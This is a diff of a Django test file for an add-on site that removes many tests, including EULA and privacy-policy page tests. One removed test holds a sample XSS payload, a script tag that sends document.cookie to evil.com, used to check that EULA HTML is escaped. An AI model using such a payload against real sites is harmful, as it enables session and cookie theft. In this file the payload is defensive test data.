@@ -9,7 +9,6 @@ from django.core.cache import cache
 from django.test.client import Client
 
 from mock import patch
-from nose import SkipTest
 from nose.tools import eq_, nottest
 from pyquery import PyQuery as pq
 
@@ -101,7 +100,7 @@ class TestHomepageFeatures(amo.tests.TestCase):
 
     def test_no_unreviewed(self):
         response = self.client.get(self.url)
-        addon_lists = 'popular featured hotness'.split()
+        addon_lists = 'popular featured'.split()
         for key in addon_lists:
             for addon in response.context[key]:
                 assert addon.status != amo.STATUS_UNREVIEWED
@@ -130,14 +129,6 @@ class TestHomepageFeatures(amo.tests.TestCase):
         featured = r.context['featured']
         assert all([a.is_featured(amo.FIREFOX, 'en-US') for a in featured]), (
             'Expected only featured extensions to be listed under Featured')
-
-    @amo.tests.mobile_test
-    def test_mobile_home_popular(self):
-        r = self.client.get(self.url)
-        popular = r.context['popular']
-        eq_([a.id for a in popular],
-            [a.id for a in sorted(popular, key=lambda x: x.average_daily_users,
-                                  reverse=True)])
 
 
 class TestPromobox(amo.tests.TestCase):
@@ -235,14 +226,6 @@ class TestDeveloperPages(amo.tests.TestCase):
         url = reverse('addons.meet', args=['a11730']) + '?version=1.x'
         r = self.client.get(url)
         eq_(r.context['version'].version, '1.x')
-
-    def test_purified(self):
-        addon = Addon.objects.get(pk=592)
-        addon.the_reason = addon.the_future = '<b>foo</b>'
-        addon.save()
-        url = reverse('addons.meet', args=['592'])
-        r = self.client.get(url, follow=True)
-        eq_(pq(r.content)('#about-addon b').length, 2)
 
 
 class TestLicensePage(amo.tests.TestCase):
@@ -343,7 +326,6 @@ class TestDetailPage(amo.tests.TestCase):
 
     def test_more_about(self):
         # Don't show more about box if there's nothing to populate it.
-        self.addon.developer_comments_id = None
         self.addon.description_id = None
         self.addon.previews.all().delete()
         self.addon.save()
@@ -546,26 +528,6 @@ class TestDetailPage(amo.tests.TestCase):
         r = self.client.get(a.get_url_path())
         eq_(pq(r.content)('#detail-relnotes .compat').length, 0)
 
-    def test_show_profile(self):
-        selector = '.author a[href="%s"]' % self.addon.meet_the_dev_url()
-
-        assert not (self.addon.the_reason or self.addon.the_future)
-        assert not pq(self.client.get(self.url).content)(selector)
-
-        self.addon.the_reason = self.addon.the_future = '...'
-        self.addon.save()
-        assert pq(self.client.get(self.url).content)(selector)
-
-    def test_no_backup(self):
-        res = self.client.get(self.url)
-        eq_(len(pq(res.content)('.backup-button')), 0)
-
-    def test_backup(self):
-        self.addon._backup_version = self.addon.versions.all()[0]
-        self.addon.save()
-        res = self.client.get(self.url)
-        eq_(len(pq(res.content)('.backup-button')), 1)
-
     def test_disabled_user_message(self):
         self.addon.update(disabled_by_user=True)
         res = self.client.get(self.url)
@@ -606,46 +568,11 @@ class TestImpalaDetailPage(amo.tests.TestCase):
         self.addon.update(type=amo.ADDON_WEBAPP)
         eq_(self.client.get(self.url).status_code, 404)
 
-    def test_adu_stats_private(self):
-        eq_(self.addon.public_stats, False)
-        adu = self.get_pq()('#daily-users')
-        eq_(adu.length, 1)
-
-    def test_adu_stats_public(self):
-        self.addon.update(public_stats=True)
-        eq_(self.addon.show_adu(), True)
-        adu = self.get_pq()('#daily-users')
-
-        # Check formatted count.
-        eq_(adu.text().split()[0], numberfmt(self.addon.average_daily_users))
-
-        # Check if we hide link when there are no ADU.
-        self.addon.update(average_daily_users=0)
-        eq_(self.get_pq()('#daily-users').length, 0)
-
-    def test_adu_stats_regular(self):
-        self.client.login(username='regular@mozilla.com', password='password')
-        # Should not be a link to statistics dashboard for regular users.
-        adu = self.get_pq()('#daily-users')
-        eq_(adu.length, 1)
-
     def test_downloads_stats_private(self):
         self.addon.update(type=amo.ADDON_SEARCH)
         eq_(self.addon.public_stats, False)
         adu = self.get_pq()('#weekly-downloads')
         eq_(adu.length, 1)
-
-    def test_downloads_stats_public(self):
-        self.addon.update(public_stats=True, type=amo.ADDON_SEARCH)
-        eq_(self.addon.show_adu(), False)
-        dls = self.get_pq()('#weekly-downloads')
-
-        # Check formatted count.
-        eq_(dls.text().split()[0], numberfmt(self.addon.weekly_downloads))
-
-        # Check if we hide link when there are no weekly downloads.
-        self.addon.update(weekly_downloads=0)
-        eq_(self.get_pq()('#weekly-downloads').length, 0)
 
     def test_downloads_stats_regular(self):
         self.addon.update(type=amo.ADDON_SEARCH)
@@ -852,117 +779,6 @@ class TestTagsBox(amo.tests.TestCase):
         eq_('SEO', doc('#tagbox ul').children().text())
 
 
-class TestEulaPolicyRedirects(amo.tests.TestCase):
-
-    def test_eula_legacy_url(self):
-        """
-        See that we get a 301 to the zamboni style URL
-        """
-        response = self.client.get('/en-US/firefox/addons/policy/0/592/42')
-        eq_(response.status_code, 301)
-        assert (response['Location'].find('/addon/592/eula/42') != -1)
-
-    def test_policy_legacy_url(self):
-        """
-        See that we get a 301 to the zamboni style URL
-        """
-        response = self.client.get('/en-US/firefox/addons/policy/0/592/')
-        eq_(response.status_code, 301)
-        assert (response['Location'].find('/addon/592/privacy/') != -1)
-
-
-class TestEula(amo.tests.TestCase):
-    fixtures = ['base/apps', 'addons/eula+contrib-addon']
-
-    def setUp(self):
-        self.addon = Addon.objects.get(id=11730)
-        self.url = self.get_url()
-
-    def get_url(self, args=[]):
-        return reverse('addons.eula', args=[self.addon.slug] + args)
-
-    def test_current_version(self):
-        r = self.client.get(self.url)
-        eq_(r.context['version'], self.addon.current_version)
-
-    def test_simple_html_is_rendered(self):
-        self.addon.eula = """
-            <strong> what the hell..</strong>
-            <ul>
-                <li>papparapara</li>
-                <li>todotodotodo</li>
-            </ul>
-            <ol>
-                <a href="irc://irc.mozilla.org/firefox">firefox</a>
-
-                Introduce yourself to the community, if you like!
-                This text will appear publicly on your user info page.
-                <li>papparapara2</li>
-                <li>todotodotodo2</li>
-            </ol>
-            """
-        self.addon.save()
-
-        r = self.client.get(self.url)
-        doc = pq(r.content)
-
-        eq_(norm(doc('.policy-statement strong')),
-            '<strong> what the hell..</strong>')
-        eq_(norm(doc('.policy-statement ul')),
-            '<ul><li>papparapara</li><li>todotodotodo</li></ul>')
-        eq_(doc('.policy-statement ol a').text(), 'firefox')
-        eq_(norm(doc('.policy-statement ol li:first')),
-            '<li>papparapara2</li>')
-
-    def test_evil_html_is_not_rendered(self):
-        self.addon.eula = """
-            <script type="text/javascript">
-                window.location = 'http://evil.com/?c=' + document.cookie;
-            </script>
-            Muhuhahahahahahaha!
-            """
-        self.addon.save()
-
-        r = self.client.get(self.url)
-        doc = pq(r.content)
-
-        policy = str(doc('.policy-statement'))
-        assert policy.startswith('<div class="policy-statement">&lt;script'), (
-            'Unexpected: %s' % policy[:50])
-
-    def test_old_version(self):
-        old = self.addon.versions.order_by('created')[0]
-        assert old != self.addon.current_version
-        r = self.client.get(self.get_url([old.all_files[0].id]))
-        eq_(r.context['version'], old)
-
-    def test_redirect_no_eula(self):
-        self.addon.update(eula=None)
-        r = self.client.get(self.url, follow=True)
-        self.assertRedirects(r, self.addon.get_url_path())
-
-    def test_cat_sidebar(self):
-        check_cat_sidebar(self.url, self.addon)
-
-
-class TestPrivacyPolicy(amo.tests.TestCase):
-    fixtures = ['base/apps', 'addons/eula+contrib-addon']
-
-    def setUp(self):
-        self.addon = Addon.objects.get(id=11730)
-        self.url = reverse('addons.privacy', args=[self.addon.slug])
-
-    def test_redirect_no_eula(self):
-        eq_(self.addon.privacy_policy, None)
-        r = self.client.get(self.url, follow=True)
-        self.assertRedirects(r, self.addon.get_url_path())
-
-    def test_cat_sidebar(self):
-        self.addon.privacy_policy = 'shizzle'
-        self.addon.save()
-        check_cat_sidebar(self.url, self.addon)
-
-
 class TestReportAbuse(amo.tests.TestCase):
     fixtures = ['base/addon_3615', 'base/users']
 
@@ -1009,24 +825,6 @@ class TestMobile(amo.tests.MobileTest, amo.tests.TestCase):
                 'base/addon_3615', 'base/featured']
 
 
-class TestMobileHome(TestMobile):
-
-    def test_addons(self):
-        # Uncomment when redis gets fixed in CI.
-        raise SkipTest
-
-        r = self.client.get('/', follow=True)
-        eq_(r.status_code, 200)
-        app, lang = r.context['APP'], r.context['LANG']
-        featured, popular = r.context['featured'], r.context['popular']
-        eq_(len(featured), 3)
-        assert all(a.is_featured(app, lang) for a in featured)
-        eq_(len(popular), 3)
-        eq_([a.id for a in popular],
-            [a.id for a in sorted(popular, key=lambda x: x.average_daily_users,
-                                  reverse=True)])
-
-
 class TestMobileDetails(TestMobile):
     fixtures = TestMobile.fixtures + ['base/featured', 'base/users']
 
@@ -1039,13 +837,6 @@ class TestMobileDetails(TestMobile):
         r = self.client.get(self.url)
         eq_(r.status_code, 200)
         self.assertTemplateUsed(r, 'addons/mobile/details.html')
-
-    def test_extension_adu(self):
-        doc = pq(self.client.get(self.url).content)('table')
-        eq_(doc('.adu td').text(), numberfmt(self.ext.average_daily_users))
-        self.ext.update(average_daily_users=0)
-        doc = pq(self.client.get(self.url).content)('table')
-        eq_(doc('.adu').length, 0)
 
     def test_extension_downloads(self):
         doc = pq(self.client.get(self.url).content)('table')
